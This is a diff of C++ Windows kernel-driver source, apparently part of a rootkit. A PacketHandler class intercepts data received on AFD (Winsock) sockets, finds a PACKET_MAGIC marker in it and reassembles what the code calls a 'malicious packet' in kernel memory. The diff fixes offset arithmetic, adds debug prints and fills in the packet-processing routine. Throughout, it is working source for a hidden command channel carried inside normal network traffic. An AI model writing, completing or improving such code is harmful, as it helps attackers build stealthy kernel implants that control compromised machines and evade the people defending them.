@@ -7,6 +7,33 @@
 #include "PacketHandler.h"
 
 /**
+	Populate the necessary members in the PacketHandler class.
+	@param SocketFileObject - The FILE_OBJECT of the Socket we're targetting.
+	@param OriginalDeviceObject - The original Device for the Afd driver.
+	@param RecvInformation - The passed AFD_RECV_INFO structure that contains important flags.
+	@param RecvBuffer - The buffer that was recv'd.
+	@param RecvBufferSize - The size in bytes of the RecvBuffer.
+	@param MagicOffset - The offset for RecvBuffer where a PACKET_MAGIC was detected.
+*/
+PacketHandler::PacketHandler (
+	_In_ PFILE_OBJECT SocketFileObject,
+	_In_ PDEVICE_OBJECT OriginalDeviceObject,
+	_In_ PAFD_RECV_INFO RecvInformation,
+	_In_ PVOID RecvBuffer,
+	_In_ ULONG RecvBufferSize,
+	_In_ ULONG MagicOffset
+	)
+{
+	this->Socket = SocketFileObject;
+	this->AfdDevice = OriginalDeviceObject;
+	this->AfdFlags = RecvInformation->AfdFlags;
+	this->TdiFlags = RecvInformation->TdiFlags;
+	this->Packet = RecvBuffer;
+	this->PacketSize = RecvBufferSize;
+	this->PacketMagicOffset = MagicOffset;
+}
+
+/**
 	Send a synchronous IOCTL request to the Afd device.
 	@param IoctlCode - The IOCTL code of the request.
 	@param InputBuffer - The buffer to send.
@@ -54,13 +81,19 @@ PacketHandler::SendSynchronousAfdRequest (
 	//
 	// Allocate the IRP for the send request.
 	//
-	Irp = IoBuildDeviceIoControlRequest(IOCTL_AFD_SEND, AfdDevice, InputBuffer, InputBufferSize, NULL, 0, FALSE, socketEvent, IoStatusBlock);
-
+	Irp = IoBuildDeviceIoControlRequest(IoctlCode, AfdDevice, InputBuffer, InputBufferSize, NULL, 0, FALSE, socketEvent, IoStatusBlock);
 
 	//
 	// This shouldn't be NULL, sanity check.
 	//
 	NT_ASSERT(Irp);
+
+	if (Irp == NULL)
+	{
+		DBGPRINT("PacketHandler!SendSynchronousAfdRequest: Failed to build device Irp.");
+		status = STATUS_NO_MEMORY;
+		goto Exit;
+	}
 
 	//
 	// Fill out missing properties in the IRP.
@@ -78,7 +111,6 @@ PacketHandler::SendSynchronousAfdRequest (
 	// Sanity checks.
 	//
 	NT_ASSERT(irpStack->MajorFunction == IRP_MJ_DEVICE_CONTROL);
-	NT_ASSERT(irpStack->Parameters.DeviceIoControl.IoControlCode == IOCTL_AFD_SEND);
 
 	IoStatusBlock->Status = STATUS_PENDING;
 
@@ -144,6 +176,8 @@ PacketHandler::SendBuffer (
 	sendBuffersUsermode = NULL;
 	sendInfoSize = sizeof(AFD_SEND_INFO);
 	sendBuffersSize = sizeof(AFD_WSABUF);
+
+	RtlZeroMemory(&dummyIOSB, sizeof(dummyIOSB));
 
 	//
 	// Since we're simulating a user-mode function, all buffers we give the Afd driver must be in user-mode memory space.
@@ -329,7 +363,7 @@ PacketHandler::ReceiveBuffer (
 		//
 		memcpy(Buffer, usermodeBuffer, BufferSize);
 
-		*BytesReceived = dummyIOSB.Information;
+		*BytesReceived = SCAST<ULONG>(dummyIOSB.Information);
 	}
 	__except (1)
 	{
@@ -369,13 +403,12 @@ PacketHandler::PopulateBasePacket (
 {
 	ULONG bytesAfterMagic;
 	ULONG bytesReceived;
-	ULONG64 currentBasePacketPosition;
 	ULONG receiveRetryCount;
 
 	//
 	// Calculate the number of bytes AFTER the PACKET_MAGIC.
 	//
-	bytesAfterMagic = PacketSize - PacketMagicOffset;
+	bytesAfterMagic = PacketSize - PacketMagicOffset - MAGIC_SIZE;
 	*RemainingBytes = 0;
 	receiveRetryCount = 0;
 
@@ -384,8 +417,10 @@ PacketHandler::PopulateBasePacket (
 	//
 	memcpy_s(PartialBasePacket,
 			 sizeof(BASE_PACKET),
-			 RCAST<PVOID>(RCAST<ULONG64>(Packet) + PacketMagicOffset),
+			 RCAST<PVOID>(RCAST<ULONG64>(Packet) + PacketMagicOffset + MAGIC_SIZE),
 			 (bytesAfterMagic > sizeof(BASE_PACKET)) ? sizeof(BASE_PACKET) : bytesAfterMagic);
+
+	DBGPRINT("PacketHandler!PopulateBasePacket: bytesAfterMagic = %u, PacketMagicOffset = %u, Packet = 0x%llx, PacketSize = %u, MAGIC_SIZE = %u.", bytesAfterMagic, PacketMagicOffset, Packet, PacketSize, MAGIC_SIZE);
 
 	//
 	// Check if we have enough bytes for a base packet.
@@ -498,6 +533,7 @@ PacketHandler::PopulateMaliciousPacket (
 			// BASE_PACKET structure and subtracting the current number of remaining bytes.
 			//
 			currentPacketOffset = (PartialBasePacket->PacketLength - sizeof(BASE_PACKET)) - remainingMaliciousBytes;
+			DBGPRINT("PacketHandler!ProcessMaliciousPacket: currentPacketOffset = %i, PartialBasePacket->PacketLength = %i, remainingMaliciousBytes = %i.", currentPacketOffset, PartialBasePacket->PacketLength, remainingMaliciousBytes);
 
 			//
 			// Receive the rest of the base packet.
@@ -532,15 +568,62 @@ PacketHandler::PopulateMaliciousPacket (
 	return TRUE;
 }
 
-VOID
-PacketHandler::ProcessPacket (
-	_In_ PFILE_OBJECT SocketFileObject,
-	_In_ PDEVICE_OBJECT OriginalDeviceObject,
-	_In_ PAFD_RECV_INFO RecvInformation,
-	_In_ PVOID RecvBuffer,
-	_In_ ULONG RecvBufferSize,
-	_In_ ULONG MagicOffset
+/**
+	Process the malicious packet.
+	@return Whether or not processing succeeded.
+*/
+BOOLEAN
+PacketHandler::Process (
+	VOID
 	)
 {
+	BOOLEAN result;
+	BASE_PACKET partialBasePacket;
+	PBASE_PACKET fullBasePacket;
+	ULONG remainingBytes;
 
+	fullBasePacket = NULL;
+	result = TRUE;
+
+	//
+	// Populate a partial base packet.
+	//
+	result = PopulateBasePacket(&partialBasePacket, &remainingBytes);
+	if (result == FALSE)
+	{
+		DBGPRINT("PacketHandler!Process: Failed to parse a partial base packet.");
+		goto Exit;
+	}
+
+	//
+	// Allocate enough space for the full malicious packet.
+	//
+	fullBasePacket = RCAST<PBASE_PACKET>(ExAllocatePoolWithTag(NonPagedPool, partialBasePacket.PacketLength, MALICIOUS_PACKET_TAG));
+	if (fullBasePacket == NULL)
+	{
+		DBGPRINT("PacketHandler!Process: Failed to allocate space for the full malicious packet with size %i.", partialBasePacket.PacketLength);
+		goto Exit;
+	}
+	memset(fullBasePacket, 0, partialBasePacket.PacketLength);
+
+	DBGPRINT("PacketHandler!Process: Received partial base packet with %i remaining bytes.", remainingBytes);
+
+	//
+	// Populate the full malicious packet.
+	//
+	result = PopulateMaliciousPacket(&partialBasePacket, fullBasePacket, remainingBytes);
+	if (result == FALSE)
+	{
+		DBGPRINT("PacketHandler!Process: Failed to parse a full base packet.");
+		goto Exit;
+	}
+
+	DBGPRINT("PacketHandler!Process: Received full packet with type %i.", fullBasePacket->Type);
+
+Exit:
+	if (fullBasePacket)
+	{
+		ExFreePoolWithTag(fullBasePacket, MALICIOUS_PACKET_TAG);
+	}
+	return result;
 }
